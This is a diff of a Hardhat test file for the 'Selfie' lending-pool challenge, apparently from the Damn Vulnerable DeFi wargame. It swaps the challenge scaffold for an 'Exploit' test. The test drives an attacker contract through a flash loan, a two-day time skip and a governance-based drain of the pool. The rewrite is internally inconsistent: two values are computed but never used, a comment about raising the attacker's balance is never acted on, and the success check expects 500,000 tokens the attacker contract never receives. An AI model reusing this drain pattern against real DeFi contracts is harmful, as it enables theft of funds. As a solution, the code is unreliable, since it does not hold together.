@@ -1,55 +1,54 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
-const { time } = require("@nomicfoundation/hardhat-network-helpers");
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Selfie', function () {
-    let deployer, player;
-    let token, governance, pool;
+describe("[Challenge] Selfie", function () {
+  this.timeout(0);
 
-    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
-    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
-    
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1500000");
+  const INITIAL_SUPPLY = ethers.utils.parseEther("2000000");
+  const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther("500000");
 
-        // Deploy Damn Valuable Token Snapshot
-        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);
+  before(async function () {
+    /** SETUP SCENARIO */
+    const setup = async () => {
+      const [deployer, attacker, ..._] = await ethers.getSigners();
 
-        // Deploy governance contract
-        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
-        expect(await governance.getActionCounter()).to.eq(1);
+      const SelfiePool = await ethers.getContractFactory("SelfiePool");
+      const SelfieAttacker = await ethers.getContractFactory("SelfieAttacker");
+      const DamnValuableTokenSnapshot = await ethers.getContractFactory("DamnValuableTokenSnapshot");
+      const SimpleGovernance = await ethers.getContractFactory("SimpleGovernance");
 
-        // Deploy the pool
-        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
-            token.address,
-            governance.address    
-        );
-        expect(await pool.token()).to.eq(token.address);
-        expect(await pool.governance()).to.eq(governance.address);
-        
-        // Fund the pool
-        await token.transfer(pool.address, TOKENS_IN_POOL);
-        await token.snapshot();
-        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
-        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
-        expect(await pool.flashFee(token.address, 0)).to.eq(0);
+      const token = await DamnValuableTokenSnapshot.deploy(INITIAL_SUPPLY);
+      const governance = await SimpleGovernance.deploy(token.address);
+      const pool = await SelfiePool.deploy(token.address, governance.address);
 
-    });
+      // Increase the attacker initial balance
+      const attackerInitialBalance = ethers.utils.parseEther("1500000");
+      const attackerContract = await SelfieAttacker.deploy(pool.address, governance.address, token.address);
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+      // Transfer initial tokens to the pool
+      await token.transfer(pool.address, TOKENS_IN_POOL);
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+      return { attacker, deployer, pool, governance, token, attackerContract };
+    };
 
-        // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.be.equal(TOKENS_IN_POOL);        
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.be.equal(0);
-    });
+    Object.assign(this, await setup());
+  });
+
+  it("Exploit", async function () {
+    const drainPoolTx = this.pool.interface.encodeFunctionData("drain", [this.attackerContract.address]);
+    await this.attackerContract.attack(TOKENS_IN_POOL); // Attack with the entire pool balance
+    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // add 2 days
+    await ethers.provider.send("evm_mine"); // mine the next block
+    await this.attackerContract.finalizeAttack();
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+    expect(await this.token.balanceOf(this.attacker.address)).to.equal(0);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(0);
+    expect(await this.token.balanceOf(this.attackerContract.address)).to.equal(
+      TOKENS_IN_POOL.add(ATTACKER_INITIAL_BALANCE)
+    );
+  });
 });
